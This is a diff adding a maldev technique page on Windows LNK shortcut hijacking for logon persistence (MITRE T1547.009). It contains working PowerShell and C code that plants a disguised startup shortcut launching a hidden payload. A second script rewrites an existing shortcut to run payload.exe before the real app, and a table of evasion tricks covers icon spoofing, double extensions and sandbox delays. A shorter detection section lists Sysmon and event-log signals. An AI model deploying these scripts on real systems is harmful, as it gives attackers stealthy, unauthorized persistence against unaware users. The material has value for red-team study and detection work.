@@ -1,0 +1,206 @@
+---
+title: LNK File Hijacking
+mitre: T1547.009
+category: persistence
+group: Boot / Logon Autostart
+summary: Plant or replace Windows shortcut files in Startup folders or on the desktop to execute arbitrary payloads on user logon.
+platform: [Windows]
+tags: ['C / C++', 'PowerShell', 'WinAPI']
+updated: '2026-08-04'
+author: thehackersbrain
+readingTime: 6 min read
+callChain:
+  - call: identify target LNK location
+    desc: Startup folder (%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup) runs for each user; All Users path runs for every logon.
+    dll: —
+  - call: IShellLink::SetPath / SetArguments (COM)
+    desc: Build a shortcut COM object pointing to the payload binary with desired arguments.
+    dll: shell32
+  - call: IPersistFile::Save
+    desc: Write the .lnk file to the chosen Startup location.
+    dll: shell32
+  - call: user logs on
+    desc: Explorer reads every .lnk in the Startup folder and executes the targets; no registry modification required.
+    dll: explorer
+detections:
+  - src: SYSMON EID 11
+    text: File creation under %APPDATA%\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\ or the equivalent All Users path.
+  - src: SYSMON EID 1
+    text: Process spawned by explorer.exe at logon with an unusual command line sourced from the Startup folder.
+  - src: WINDOWS EID 4688
+    text: Process creation at logon time whose image path is in a user-writable directory (TEMP, AppData, Downloads).
+  - src: BEHAVIOURAL
+    text: .lnk file whose target path differs from the visible shortcut name (e.g. shortcut named "Chrome" pointing to a temp path).
+related:
+  - mitre: T1547.001
+    title: Registry Run Keys
+    desc: Registry-based autostart — equivalent persistence without touching the filesystem Startup folder.
+    href: /techniques/persistence/registry-run-keys
+  - mitre: T1574.001
+    title: DLL Hijacking
+    desc: Chain LNK persistence with a DLL hijack in the launched application for additional stealth.
+    href: /techniques/persistence/dll-hijacking
+  - mitre: T1036.005
+    title: Masquerading
+    desc: Name the LNK and icon to match a legitimate application to reduce user suspicion.
+labKit:
+  - label: lnk_create.ps1
+    href: 'https://github.com/thehackersbrain/maldev-lab-kit'
+  - label: Sigma rule pack
+    href: /detections
+---
+
+import Callout from '../../../components/Callout.astro';
+import CallChain from '../../../components/CallChain.astro';
+import CodeBlock from '../../../components/CodeBlock.astro';
+import DetectionGrid from '../../../components/DetectionGrid.astro';
+import RelatedList from '../../../components/RelatedList.astro';
+
+## Overview
+
+Windows `.lnk` shortcut files in the **Startup folder** are executed by Explorer at every user logon — no registry modification, no service installation, no elevated privileges required. An attacker with write access to the user's profile can silently plant a malicious shortcut that persists across reboots.
+
+The technique scales: the per-user Startup folder (`%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup`) requires only user-level write access, while the machine-wide All Users path (`%ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup`) requires admin rights and fires for every user who logs on. Adversaries frequently abuse this as a persistence fallback alongside registry Run keys because both paths are often missed by defenders focused on registry monitoring.
+
+<Callout type="note">
+  Replace an existing legitimate shortcut rather than creating a new one to avoid the telltale
+  "new file in Startup folder" event. Backup the original `.lnk` bytes and restore them if
+  the attacker needs to clean up — the legitimate shortcut must keep working so the user
+  does not notice anything changed.
+</Callout>
+
+## The call chain
+
+<CallChain steps={frontmatter.callChain} />
+
+## Reference implementation
+
+### PowerShell — create malicious shortcut
+
+<CodeBlock
+  file="create_lnk.ps1"
+  label="PowerShell"
+  lang="powershell"
+  class="mb-7.5"
+  code={`# Per-user Startup folder — no elevation required
+$startup = [Environment]::GetFolderPath('Startup')
+$lnk_path = Join-Path $startup "OneDriveSync.lnk"
+
+$wsh  = New-Object -ComObject WScript.Shell
+$link = $wsh.CreateShortcut($lnk_path)
+
+$link.TargetPath     = "C:\\Windows\\System32\\cmd.exe"
+$link.Arguments      = "/c start /min C:\\Users\\Public\\update.exe"
+$link.WorkingDirectory = "C:\\Windows\\System32"
+$link.Description    = "OneDrive Sync Helper"
+$link.WindowStyle    = 7  # SW_SHOWMINNOACTIVE — minimised, no focus
+
+# Use a system DLL icon to look like a legitimate entry
+$link.IconLocation   = "C:\\Windows\\System32\\shell32.dll,13"
+
+$link.Save()
+Write-Host "[+] Shortcut created at $lnk_path"`}
+/>
+
+### C — create LNK via IShellLink COM
+
+<CodeBlock
+  file="create_lnk.c"
+  label="C"
+  lang="c"
+  class="mb-7.5"
+  code={`#include \u003cwindows.h\u003e
+#include \u003cshlobj.h\u003e
+#include \u003cobjbase.h\u003e
+#pragma comment(lib, "ole32.lib")
+#pragma comment(lib, "shell32.lib")
+
+HRESULT create_startup_lnk(const wchar_t *payload, const wchar_t *args,
+                            const wchar_t *lnk_name) {
+    CoInitialize(NULL);
+
+    IShellLinkW *psl = NULL;
+    HRESULT hr = CoCreateInstance(&CLSID_ShellLink, NULL,
+        CLSCTX_INPROC_SERVER, &IID_IShellLinkW, (void**)&psl);
+    if (FAILED(hr)) return hr;
+
+    psl->lpVtbl->SetPath(psl, payload);
+    psl->lpVtbl->SetArguments(psl, args);
+    psl->lpVtbl->SetShowCmd(psl, SW_SHOWMINNOACTIVE);
+    psl->lpVtbl->SetDescription(psl, L"System Update Helper");
+
+    // Build path: %APPDATA%\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\name.lnk
+    wchar_t startup[MAX_PATH];
+    SHGetFolderPathW(NULL, CSIDL_STARTUP, NULL, SHGFP_TYPE_CURRENT, startup);
+    wchar_t lnk_path[MAX_PATH];
+    swprintf_s(lnk_path, MAX_PATH, L"%s\\%s.lnk", startup, lnk_name);
+
+    IPersistFile *ppf = NULL;
+    hr = psl->lpVtbl->QueryInterface(psl, &IID_IPersistFile, (void**)&ppf);
+    if (SUCCEEDED(hr)) {
+        hr = ppf->lpVtbl->Save(ppf, lnk_path, TRUE);
+        ppf->lpVtbl->Release(ppf);
+    }
+    psl->lpVtbl->Release(psl);
+    CoUninitialize();
+    return hr;
+}`}
+/>
+
+### Hijack an existing shortcut (stealthier)
+
+<CodeBlock
+  file="hijack_lnk.ps1"
+  label="PowerShell"
+  lang="powershell"
+  class="mb-7.5"
+  code={`# Replace an existing Startup shortcut, preserving the appearance
+$startup = [Environment]::GetFolderPath('Startup')
+$target  = Get-ChildItem $startup -Filter "*.lnk" | Select-Object -First 1
+
+if ($target) {
+    $wsh  = New-Object -ComObject WScript.Shell
+    $link = $wsh.CreateShortcut($target.FullName)
+
+    # Save original for cleanup
+    $orig_target = $link.TargetPath
+    $orig_args   = $link.Arguments
+
+    Write-Host "[*] Original: $orig_target $orig_args"
+
+    # Replace target while keeping icon/description unchanged
+    $link.TargetPath = "C:\\Windows\\System32\\cmd.exe"
+    $link.Arguments  = "/c C:\\Users\\Public\\payload.exe & $orig_target $orig_args"
+    $link.Save()
+
+    Write-Host "[+] Hijacked: $($target.FullName)"
+}`}
+/>
+
+## Startup folder locations
+
+| Scope | Path | Rights required |
+|---|---|---|
+| Current user | `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` | User |
+| All users | `%ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup` | Admin |
+| All users (XP-era) | `%ALLUSERSPROFILE%\Start Menu\Programs\Startup` | Admin |
+
+## Evasion variants
+
+| Variant | Technique |
+|---|---|
+| Double-extension LNK | Name it `report.pdf.lnk`; Windows hides `.lnk` extension by default |
+| Icon spoofing | Set `IconLocation` to a PDF/Word icon from shell32.dll |
+| Minimised window | `SW_SHOWMINNOACTIVE` prevents a visible console flash |
+| `cmd /c` chain | Launch payload, then original app — user sees normal behaviour |
+| Delayed execution | `ping 127.0.0.1 -n 30 & payload.exe` — skip sandbox timing |
+
+## Detection
+
+<DetectionGrid items={frontmatter.detections} />
+
+Monitoring file creation in Startup folders is the highest-fidelity detection. Correlate with the process that wrote the file (`Sysmon EID 11` includes the image that created the file) — Explorer and the Windows Installer are legitimate writers; `powershell.exe`, `cmd.exe`, or any process from a user-writable location should alert.
+
+## Variants & related
+
+<RelatedList items={frontmatter.related} />
